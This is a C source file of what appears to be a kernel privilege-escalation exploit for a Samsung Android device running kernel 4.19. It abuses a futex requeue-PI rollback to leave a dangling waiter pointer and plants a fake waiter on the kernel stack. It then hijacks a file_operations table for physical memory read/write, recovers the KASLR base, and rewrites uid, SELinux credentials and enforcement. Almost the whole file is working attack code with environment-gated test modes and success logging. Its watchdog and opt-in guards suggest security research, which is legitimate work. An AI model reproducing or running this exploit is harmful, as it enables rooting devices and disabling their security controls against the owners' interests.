#include "common.h"

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int consumer_walked;
atomic_int consumer_inflight;
atomic_int consumer_last_ret = -1;
atomic_int consumer_last_errno;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
int memfd_leak;

static pid_t punch_watchdog_pid = -1;

#define PUNCH_WATCHDOG_TIMEOUT_MS 90000

/* If the stale-waiter punch never returns, this child is the only thing
 * left that can still log and kill the process.  Parent sends one byte
 * through the pipe after route_done; silence past 90s means "stuck". */
static pid_t start_punch_watchdog(int *parent_fd) {
  int pfd[2];
  pid_t parent_pid = getpid();

  if (pipe(pfd) != 0) {
    return -1;
  }

  pid_t pid = fork();
  if (pid < 0) {
    close(pfd[0]);
    close(pfd[1]);
    return -1;
  }
  if (pid == 0) {
    close(pfd[1]);
    struct pollfd p = { .fd = pfd[0], .events = POLLIN, .revents = 0 };
    int ret = poll(&p, 1, PUNCH_WATCHDOG_TIMEOUT_MS);
    if (ret <= 0) {
      pr_warning("punch watchdog timeout parent=%d status=stuck\n", parent_pid);
      kill(parent_pid, SIGKILL);
      _exit(2);
    }
    _exit(0);
  }

  pr_info("punch watchdog started pid=%d parent=%d\n", pid, parent_pid);

  close(pfd[0]);
  ks_relocate_fd_min(&pfd[1], KS_FD_PROTECT_MIN);
  if (parent_fd) {
    *parent_fd = pfd[1];
  }
  return pid;
}

static void finish_punch_watchdog(pid_t pid, int pfd) {
  if (pid < 0) {
    return;
  }
  if (pfd >= 0) {
    char one = 1;
    ssize_t ignored = write(pfd, &one, sizeof(one));
    (void)ignored;
    close(pfd);
  }
  int status = 0;
  waitpid(pid, &status, 0);
}

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("waiter lock chain errno=%d\n", errno);
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;

  atomic_store(&waiter_waiting, 1);
  int futex_ret = 0;
  if (getenv("KS_PLANT_CLEAN")) {
    /* Control: never block in futex, so pi_blocked_on is provably NULL.
     * A punch that still panics here is a vendor scheduler defect, not the
     * stale-waiter walk. */
  } else {
    futex_ret = (int)futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                              &f_pi_target, 0);
  }
  pr_info("waiter futex returned ret=%d errno=%d\n", futex_ret, errno);
  /* Plant from THIS frame: the stale waiter sits only 0x190 below
   * the SP used for the futex svc, so the write must not come from
   * a deeper call chain. */
  plant_waiter_install();
  plant_shallow();
  if (plant_shallow_done) {
    /* The consumer only punches when the plant is announced. */
    atomic_store(&plant_ready, 1);
  }

  if (plant_shallow_done) {
    /* The plant lives in this frame's stack.  Any deeper call overwrites it
     * with its own locals (the route zeroes three fd_sets = 0x180), so arm the
     * punch and spin here with no further calls. */
    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    atomic_store(&main_route_delay_usec, 0);
    atomic_store(&punch_consume_go, 1);
    for (volatile long spin = 0; spin < 32000000000L; spin++) {
      if (atomic_load(&consumer_calls) > 0 &&
          atomic_load(&consumer_inflight) == 0) {
        break;
      }
      __asm__ volatile("yield" ::: "memory");
    }
    atomic_store(&punch_consume_go, 0);
    pr_info("shallow plant punched calls=%d success=%d\n",
            atomic_load(&consumer_calls), atomic_load(&consumer_success));
  } else if (getenv("KS_SELECT_INLINE")) {
    /* Issue pselect from this frame so its fd-set copy lands on
     * the stale waiter instead of 0x500 bytes below it. */
    plant_fdset_at_futex_depth();
  } else {
    do_pselect_fake_lock_route();
  }
  atomic_store(&route_done, 1);

  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) {
    pr_error("owner lock target errno=%d\n", errno);
  }

  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);

  for (;;) {
    sleep(1);
  }
}

/* The punch is only valid while the victim is asleep inside pselect: that
 * syscall frame is what holds the encoded stale waiter.  If pselect already
 * returned (timeout or a signal), the kernel stack has been reused and
 * sched_setattr() would walk garbage.  Return 1 = sleeping, 0 = running,
 * -1 = state unavailable. */
static int victim_is_sleeping(int tid) {
  char path[64];
  char buf[512];
  snprintf(path, sizeof(path), "/proc/self/task/%d/stat", tid);
  int fd = open(path, O_RDONLY);
  if (fd < 0) return -1;
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0) return -1;
  buf[n] = 0;
  char *end = strrchr(buf, ')');
  if (!end || end[1] != ' ' || !end[2]) return -1;
  return end[2] == 'S';
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;

  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }

    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      if (atomic_load(&punch_consume_stop) ||
          atomic_load(&punch_consume_go) != seq) {
        continue;
      }
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) {
        usleep((useconds_t)delay_usec);
      }
#ifdef SIGRET_WAITER_LANE
      /* Plant route: the victim is spinning in userspace and must not
       * enter the kernel until this punch completes, so its thread state
       * is Running, not Sleeping.  Wait for the plant instead. */
      long plant_spin = 0;
      while (!atomic_load(&plant_ready)) {
        if (atomic_load(&punch_consume_go) != seq ||
            atomic_load(&punch_consume_stop) || ++plant_spin > 4000000000L) {
          break;
        }
        __asm__ volatile("yield" ::: "memory");
      }
      if (!atomic_load(&plant_ready)) {
        pr_warning("consumer punch skip tid=%d: waiter plant not ready\n", tid);
        atomic_store(&punch_consume_go, 0);
        break;
      }
#else
      int sleeping = victim_is_sleeping(tid);
      if (sleeping == 0) {
        pr_warning("consumer punch skip tid=%d: victim left pselect, waiter "
                   "stack no longer valid\n", tid);
        atomic_store(&punch_consume_go, 0);
        break;
      }
      if (sleeping < 0) {
        pr_warning("consumer punch state unknown tid=%d; relying on the 3s "
                   "pselect timeout\n", tid);
      }
#endif
      /* Delivery evidence from the victim's last kernel entry.  The victim
       * cannot log it itself: any syscall there would reuse the stack that
       * holds the planted waiter. */
      {
        /* Does the fpsimd window really hold our bytes?  Three independent
         * signals: the handler ran at all (hits), rt_sigreturn restored the
         * registers from the frame (mismatch == 0), and the lane-2 qword is
         * the planted value. */
        sigset_t cur;
        int blocked = -1;
        if (pthread_sigmask(SIG_SETMASK, NULL, &cur) == 0) {
          blocked = sigismember(&cur, PLANT_SIGNAL);
        }
        pr_info("plant prio=%d nice=%d reading ret=%ld errno=%ld ready=%d "
                "hits=%d "
                "mismatch=%d blocked=%d q0=%016llx lane2=%016llx\n",
                plant_prio_used, plant_victim_nice, plant_adjtimex_ret,
                plant_adjtimex_errno,
                atomic_load(&plant_ready), (int)plant_hits, plant_fp_mismatch,
                blocked, (unsigned long long)plant_fp_readback[0],
                (unsigned long long)plant_fp_readback[2]);
      }
      errno = 0;
      atomic_store(&consumer_inflight, 1);
      atomic_fetch_add(&consumer_calls, 1);
      pr_info("consumer punch enter tid=%d\n", tid);
      long sched_ret =
        sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
      int sched_errno = errno;
      pr_info("consumer punch first ret=%ld errno=%d\n", sched_ret,
              sched_errno);
      atomic_store(&consumer_last_ret, (int)sched_ret);
      atomic_store(&consumer_last_errno, sched_errno);
      int walked = 0;
      if (sched_ret == 0) {
        walked = punch_walk_marker();
        atomic_store(&consumer_walked, walked);
        /* success now means the chain reached our fake page, not merely
         * that sched_setattr returned 0. */
        atomic_fetch_add(&consumer_success, walked ? 1 : 0);
      }
      /* inflight=0 is the release signal for the waiter's busy-wait; it
       * must come after every other state update or the waiter reads
       * stale last_ret/success values (the "phantom -1" log race). */
      atomic_store(&consumer_inflight, 0);
      pr_info("consumer punch done tid=%d ret=%ld errno=%d walked=%d\n",
              tid, sched_ret, sched_errno, walked);
      calls_this_seq++;
      if (calls_this_seq >= CONSUMER_MAX_CALLS) {
        atomic_store(&punch_consume_go, 0);
        break;
      }
    }
  }

  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&plant_ready, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&consumer_inflight, 0);
  atomic_store(&consumer_walked, 0);
  atomic_store(&consumer_last_ret, -1);
  atomic_store(&consumer_last_errno, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
  cfi_last_step = 0;
  cfi_last_errno = 0;
}

void run_main_route_threads(void) {
  reset_main_route_state();

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;

  int watchdog_pipe = -1;
  punch_watchdog_pid = start_punch_watchdog(&watchdog_pipe);
  pr_info("main route starting pid=%d watchdog=%d\n", getpid(),
          punch_watchdog_pid);
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    usleep(1000);
  }

  usleep(100000);
  errno = 0;
  {
    long requeue_ret =
        futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
    int requeue_errno = errno;
    /* -EDEADLK is the expected rollback: the futex_q keeps rt_waiter set, the
     * waiter then leaves through handle_early_requeue_pi_wakeup() and that
     * path never clears the dangling pi_blocked_on the punch needs.  Any
     * other value means the punch has no pointer to walk. */
    pr_info("main route requeue ret=%ld errno=%d expect=%d\n", requeue_ret,
            requeue_errno, EDEADLK);
  }

  /* NOTE: the Neo11Plus-style early FUTEX_WAKE is a no-op on 4.19:
   * futex_wake() returns -EINVAL for any q with rt_waiter set, which is
   * exactly the dangling state left by the -EDEADLK rollback.  The
   * waiter instead returns via its own 1s timeout through
   * handle_early_requeue_pi_wakeup(), which unqueues the futex_q and
   * also never touches the dangling pi_blocked_on. */

  while (!atomic_load(&route_done)) {
    if (atomic_exchange(&pipe_prepare_request, 0)) {
      pipebuf_page_base = prepare_pipe_buffer_page();
      atomic_store(&pipe_prepare_done, 1);
    }
    usleep(10000);
  }
  pr_info("main route done\n");
  finish_punch_watchdog(punch_watchdog_pid, watchdog_pipe);
}

int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;

  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  log_startup_context();
  init_ashmem_path();

  const int w1_test = getenv("KS_W1_TEST") != NULL;
  if (w1_test) {
    pr_info("KS_W1_TEST mode: slide disabled, using FOPS payload only\n");
  }

  if (getenv("KS_H1A_TEST") != NULL && !strcmp(getenv("KS_H1A_TEST"), "1")) { /* H1A_GATE */
    extern int slide_h1a_punch_test(void);
    int h1a_ret = slide_h1a_punch_test();
    fflush(stdout);
    _exit(h1a_ret ? 2 : 0);
  }
  if (getenv("KS_H1A_S2_TEST") != NULL &&
      !strcmp(getenv("KS_H1A_S2_TEST"), "1")) {
    int h1a_s2_ret = slide_h1a_s2_test();
    fflush(stdout);
    _exit(h1a_s2_ret ? 2 : 0);
  }
  if (getenv("KS_H1A_W_TEST") != NULL && !strcmp(getenv("KS_H1A_W_TEST"), "1")) {
    int h1a_w_ret = slide_h1a_w_test();
    fflush(stdout);
    _exit(h1a_w_ret ? 2 : 0);
  }
  if (getenv("KS_H1A_D_TEST") != NULL && !strcmp(getenv("KS_H1A_D_TEST"), "1")) {
    int h1a_d_ret = slide_h1a_d_test();
    fflush(stdout);
    _exit(h1a_d_ret ? 2 : 0);
  }
  pin_to_core(CORE);
  if (!w1_test) {
    if (getenv("KS_SLIDE_TEST")) {
      if (!slide_leak_kernel_base()) {
        pr_error("KS_SLIDE_TEST fail\n");
        fflush(stdout);
        _exit(2);
      }
      pr_success("KS_SLIDE_TEST success base=%016zx slide=%016zx\n", kaslr_base,
                 kaslr_slide);
      fflush(stdout);
      _exit(0);
    }
    /* The M2 route skips slide KASLR; the pselect/fops route itself is
     * re-opened for M5 under ADR-0003, with KernelSnitch supplying KASLR. */
    pr_info("slide skipped; KASLR via configfs scan after fops hijack\n");
    kaslr_base = 0;
    kaslr_slide = 0;
    kaslr_done = 0;
    /* A previous run can have recovered the slide through /proc/kallsyms
     * (after the kptr_restrict/selinux pointer stores).  KS_KASLR_BASE
     * takes that runtime base so the fake fops table is built with real
     * text addresses instead of the link-time ones. */
    {
      const char *kb = getenv("KS_KASLR_BASE");
      if (kb && *kb) {
        kaslr_base = strtoull(kb, NULL, 0);
        kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
        kaslr_done = 1;
        pr_info("KS_KASLR_BASE base=%016llx slide=%016llx\n",
                (unsigned long long)kaslr_base,
                (unsigned long long)kaslr_slide);
      }
    }
  }

  pin_to_core(CORE);
  /* Placement probe: the equal-priority waiter exits rt_mutex_adjust_pi()
   * before it dereferences lock/task, so neither the mm leak nor the fake
   * page is needed.  Skipping both turns a ten-minute scan into one second. */
  int plant_probe = getenv("KS_PLANT_PROBE") != NULL;
  /* Fail closed: the order-3 reclaim is validated (KS_PAGE_PROBE survives
   * and every sprayed page is unchanged, see the device validation record),
   * but the PI-chain punch itself cannot reach shaped bytes on this kernel -
   * pi_blocked_on is cleared on every non-acquire exit.  Keep the explicit
   * opt-in so a punch run is never accidental. */
  if (!plant_probe && !getenv("KS_PAGE_PROBE") && !getenv("KS_FOPS_ROUTE")) {
    pr_error("fops punch disabled: fake-page placement unvalidated "
             "(see docs/targets/samsung-g986u1-4.19.113-sigret-plant.md; "
             "set KS_FOPS_ROUTE=1 to force) ");
    fflush(stdout);
    return 3;
  }
  if (plant_probe) {
    pr_info("KS_PLANT_PROBE: skipping mm leak and page preparation\n");
    page_base = 0;
  } else {
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
    if (getenv("KS_STOP_AFTER_SPRAY")) {
      /* Leave the device alive so /proc/slabinfo can be read: it shows
       * whether the leaked mm's slab actually returned to the buddy
       * allocator after the reap, which is the current placement suspect. */
      pr_info("KS_STOP_AFTER_SPRAY page=%016zx\n", (size_t)page_base);
      fflush(stdout);
      return 0;
    }
    if (w1_test && !page_base) {
      pr_error("KS_W1_TEST fail step=page-prepare\n");
      fflush(stdout);
      return 2;
    }
    if (!page_base) {
      /* Without a page there is no fake lock, no fake waiter and no fops
       * table, so the punch can only walk a null pointer into
       * rt_mutex_adjust_prio_chain and panic the device.  A failed leak is a
       * retry, not a reboot: bail out and leave the phone up. */
      pr_error("KS_PUNCH_SKIPPED page=0: fake-page preparation failed, "
               "not entering the punch\n");
      fflush(stdout);
      return 4;
    }
  }

  run_main_route_threads();

  if (w1_test) {
    if (atomic_load(&cfi_stage_done)) {
      pr_success("KS_W1_TEST success page=%016zx fops=%016zx "
                 "before=%016llx after=%016llx write=%zd read=%zd\n",
                 page_base, fake_fops,
                 (unsigned long long)fops_before,
                 (unsigned long long)fops_after,
                 cfi_write_ret, cfi_read_ret);
      fflush(stdout);
      return 0;
    }
    pr_error("KS_W1_TEST fail page=%016zx fops=%016zx step=%d errno=%d\n",
             page_base, fake_fops, cfi_last_step, cfi_last_errno);
    fflush(stdout);
    return 3;
  }

  pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done,
             kaslr_done, kaslr_base, kaslr_slide);
  pr_success("pipe physrw pid=%d done=%d root=%d kaslr=%d read_ok=%d "
             "write_ok=%d rw64=%d/%d uid=%u->%u sid=%u/%u->%u/%u "
             "selinux=%u->%u setgid=%d setuid=%d setenforce=%d/%d\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done, kaslr_done,
             physrw_read_ok, physrw_write_ok, physrw_read64_ok, physrw_write64_ok,
             root_uid_before, root_uid_after, cred_sid_before, real_cred_sid_before,
             cred_sid_after, real_cred_sid_after, selinux_before, selinux_after,
             setgid_ret, setuid_ret, setenforce_ret, setenforce_errno);
  if (pipe_prepare_child > 0) {
    SYSCHK(kill(pipe_prepare_child, SIGKILL));
    SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
  }
  sleep(5);
  return 0;
}
